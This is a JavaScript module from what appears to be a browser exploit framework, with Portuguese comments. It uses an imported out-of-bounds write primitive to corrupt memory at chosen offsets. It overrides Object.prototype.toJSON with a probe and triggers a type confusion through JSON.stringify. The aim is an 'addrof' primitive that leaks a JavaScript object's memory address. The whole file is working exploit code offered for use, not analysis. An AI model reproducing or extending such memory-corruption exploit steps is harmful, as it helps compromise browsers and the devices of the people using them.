// js/script3/testSpeculativeAddrof.mjs

import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

export const FNAME_MODULE = "SpeculativeAddrof_v1";

const CONFIG = {
    victim_ab_size: 64,
    // Mesmos offsets e valores do seu arquivo, pois sabemos que eles causam o comportamento
    corruption_offsets: [ 0x70, 0x78, 0x7C ],
    values_to_write: [ 0xFFFFFFFF, 0x0, 0x1 ],
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    stop_on_first_success: true,
};

// --- Variáveis de escopo para a sonda ---
let victim_ab_ref = null;
let object_to_leak_ref = null;
let addrof_result = {};

// --- Sonda toJSON para realizar a escrita para addrof ---
function toJSON_Addrof_Probe() {
    try {
        // Tenta um acesso que falhará se a TC ocorrer
        const will_fail_if_confused = this.byteLength;
    } catch (e) {
        logS3(`---> [toJSON_Probe] TYPE CONFUSION DETECTADA! Erro: ${e.message}`, "vuln");
        // Se a confusão ocorreu, 'this' é agora um objeto genérico.
        // Tentamos a escrita para vazar o endereço.
        try {
            this[0] = object_to_leak_ref;
            addrof_result.write_attempted = true;
            logS3(`---> [toJSON_Probe] Escrita para addrof realizada em this[0].`, "vuln");
        } catch (e_write) {
            logS3(`---> [toJSON_Probe] Erro durante a escrita para addrof: ${e_write.message}`, "error");
        }
        return { toJSON_error: true }; // Retorna para sinalizar o sucesso da detecção
    }
    // Se não houve erro, a TC não ocorreu com esta combinação.
    return { toJSON_executed: true };
}

// --- Função Principal do Teste ---
export async function executeSpeculativeAddrofTest() {
    const FNAME_TEST = `${FNAME_MODULE}.execute`;
    logS3(`--- Iniciando ${FNAME_TEST}: Tentativa de Addrof Especulativo ---`, "test", FNAME_TEST);

    let overallResult = {
        success: false,
        leaked_address: null,
        message: "Nenhuma combinação vulnerável encontrada."
    };

    for (const offset of CONFIG.corruption_offsets) {
        if (overallResult.success && CONFIG.stop_on_first_success) break;

        for (const value of CONFIG.values_to_write) {
            if (overallResult.success && CONFIG.stop_on_first_success) break;

            await triggerOOB_primitive({ force_reinit: true });
            if (!oob_array_buffer_real) {
                logS3("Falha ao configurar ambiente OOB. Pulando.", "error", FNAME_TEST);
                continue;
            }

            // Resetar estado para a iteração
            victim_ab_ref = new ArrayBuffer(CONFIG.victim_ab_size);
            object_to_leak_ref = { marker: "Leaked" + Date.now() };
            addrof_result = { write_attempted: false };
            let float64_view = new Float64Array(victim_ab_ref);
            float64_view.fill(1.2345); // Padrão de preenchimento

            const originalDesc = Object.getOwnPropertyDescriptor(Object.prototype, CONFIG.ppKey);

            try {
                logS3(`--- Iteração: Offset=${toHex(offset)}, Valor=${toHex(value)} ---`, 'subtest', FNAME_TEST);
                Object.defineProperty(Object.prototype, CONFIG.ppKey, { value: toJSON_Addrof_Probe, writable: true, configurable: true, enumerable: false });

                // Corrupção
                oob_write_absolute(offset, value, CONFIG.bytes_to_write_for_corruption);
                logS3(`CORRUPÇÃO: Escrito ${toHex(value)} em ${toHex(offset)}.`, 'warn', FNAME_TEST);
                await PAUSE_S3(50);

                // Gatilho
                JSON.stringify(victim_ab_ref);

                // Análise Pós-Gatilho
                if (addrof_result.write_attempted) {
                    const val_double = float64_view[0];
                    if (val_double === 1.2345) {
                        overallResult.message = `TC em ${toHex(offset)}/${toHex(value)} OK, mas o buffer não mudou.`;
                        logS3(overallResult.message, 'warn', FNAME_TEST);
                    } else {
                        const buffer = new ArrayBuffer(8);
                        new Float64Array(buffer)[0] = val_double;
                        const int_view = new Uint32Array(buffer);
                        const leaked_addr = new AdvancedInt64(int_view[0], int_view[1]);
                        
                        overallResult.success = true;
                        overallResult.leaked_address = leaked_addr.toString(true);
                        overallResult.message = `SUCESSO! Addrof com ${toHex(offset)}/${toHex(value)}. Addr: ${overallResult.leaked_address}`;
                        logS3(overallResult.message, 'vuln', FNAME_TEST);
                    }
                }

            } finally {
                if (originalDesc) Object.defineProperty(Object.prototype, CONFIG.ppKey, originalDesc);
                else delete Object.prototype[CONFIG.ppKey];
            }
        }
    }

    clearOOBEnvironment();
    logS3(`--- Teste Especulativo de Addrof Concluído ---`, "test", FNAME_TEST);
    return overallResult;
}
